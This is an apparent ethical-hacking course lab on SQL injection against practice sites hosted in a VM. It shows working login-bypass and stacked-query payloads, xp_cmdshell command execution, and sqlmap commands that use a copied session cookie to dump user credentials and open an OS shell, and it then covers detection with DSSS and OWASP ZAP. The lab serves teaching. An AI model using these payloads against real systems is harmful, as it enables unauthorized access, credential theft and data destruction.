# LAB 15 - SQL injection

## Lab 1 - Perform SQL injection attacks

SQL injection can be used to implement the following attacks:

- **Authentication bypass** An attacker logs into an application without providing a valid username and password and gains administrative privileges
- **Information disclosure** An attacker obtains sensitive information that is stored in the database
- **Compromised availability of data** An attacker deletes specific information, the log, or audit information in a database
- **Remote code execution** An attacker executes a piece of code remotely that can compromise the host OS

### Lab 15.1 - task 1 - Perform an SQL injection attack on an MSSQL Database

This task uses the [http://www.goodshopping.com] site who is hosted in the Windows server 2019 virtual machine.

#### Task 1.1 - Login without valid credentials

In the login form, in the Username field, type the query:

```sql
blah' or 1=1
```

and leave the password field empty. Click the Log in button.

You are logged into the website with a fake login

#### Task 1.2 - Create your own user account

In the login form, in the Username field, type the query:

```sql
blah';INSERT INTO login VALUES('john','apple123'); --
```

and leave the password field empty. Click the Log in button.

If no error message is displayed, it means that you have successfully created your login using an SQL injection query.

#### Task 1.3 - Create and delete database

In the login form, in the Username field, type the query:

```sql
blah';CREATE DATABASE mydatabase; --
```

and leave the password field empty. Click the Log in button.

If no error message is displayed, it means that the site is vulnerable to SQL injection and a database with the name mydatabase has been created on the database server.

In the login form, in the Username field, type the query:

```sql
blah';DROP DATABASE mydatabase; --
```

and leave the password field empty. Click the Log in button.

#### Task 1.4 - Perform ping operation using SQL injection

In the login form, in the Username field, type the query:

```sql
blah';EXEC master..xp_cmdshell 'ping www.certifiedhacker.com -l 65000 -t'; --
```

and leave the password field empty. Click the Log in button.

The login page shows a Waiting for www.goodshopping.com... message at the bottom of the window.

### Lab 15.1 - task 2 - Perform an SQL injection attack against MSSQL Database to extract databases using sqlmap

In this lab, you will pretend that you are a registered user on the [http://www.moviescope.com] website, and you want to crack the passwords of the others users from the website's database.

The site is hosted on the Windows server 2019 virtual machine.

#### Task 2.1 - Login in to MovieScope

After you login with the registered user, click "View profile" and make a note of the URL in the address bar of the browser.

Right click anywhere on the webpage and click "Inspect element" from the context menu. The developers tools frame appears.

#### Task 2.2 - Obtain session cookie

Click the Console tab, type document.cookie and press Enter.

Select the cookie value, then right-click and copy it.

#### Task 2.3 - Retrieve database

On the terminal, type:

```bash
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="<cookie value that you copied>" --dbs
```

and press Enter.

This query causes sqlmap to enforce various injection techniques on the name parameter of the URL in an attempt to extract the database information of the MovieScope website.

Press Y for each message that appears and Enter to continue.

sqlmap retrieves the database present in the MSSQL server. It also displays information about the web server OS, web application technology, and the backend DBMS.

Now, you need to choose a database and use sqlmap to retrieve his tables.

```bash
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="<cookie value which you have copied>" -D moviescope --tables
```

and press Enter.

sqlmap retrieves the table contents of the moviescope database and displays them.

#### Task 2.4 - Retrieve user accounts

On the terminal, type:

```bash
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="<cookie value that you copied>" -D moviescope -T User_Login --dump
```

and press Enter to dump all the User_Login table content.

#### Task 2.5 - Log in to MovieScope using different account

#### Task 2.6 - Open an interactive OS shell

On the terminal, type:

```bash
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="<cookie value that you copied>" --os-shell
```

and press Enter.

Once sqlmap acquires the permission to optimize the machine, it will provide you with the OS shell.

Type **hostname** to find the machine name where the site is running.

Type **TASKLIST** and press Enter to view a list of tasks that are currently running on the target system.

You can use various other commands to obtain further detailed information about the target machine (type help and press Enter to view the available commands).

## Lab 2 - Detect SQL injection vulnerabilities using various detection tools

### Lab 15.2 - task 1 - Detect SQL injection vulnerabilities using DSSS

#### Task 1.1 - Clone DSSS repository

On the terminal type

```bash
git clone https://github.com/stamparm/DSSS

cd DSSS

python3 dsss.py
```

#### Task 1.2 - Log in to MovieScope

#### Task 1.3 - Obtain session cookie

#### Task 1.4 - Scan the website for SQL injection vulnerabilities

On the terminal type

```bash
python3 dsss.py -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="<cookie value which you have copied>"
```

and press Enter.

The result shows that the target website is vulnerable. The vulnerable link is displayed.

#### Task 1.5 - View the vulnerable website link

Copy the vulnerable website link, paste it in to Browser.

You will observe that information regarding available user accounts appears under the View profile tab.

### Lab 15.2 - task 2 - Detect SQL injection vulnerabilities using OWASP ZAP

#### Task 2.1 - Launch and configure OWASP ZAP

#### Task 2.2 - Perform automated scan

Enter the target website in the "URL to attack" field, and then click the "Attack" button.

After the scan completes, Alerts tab appears.

Expand the SQL injection vulnerability node.
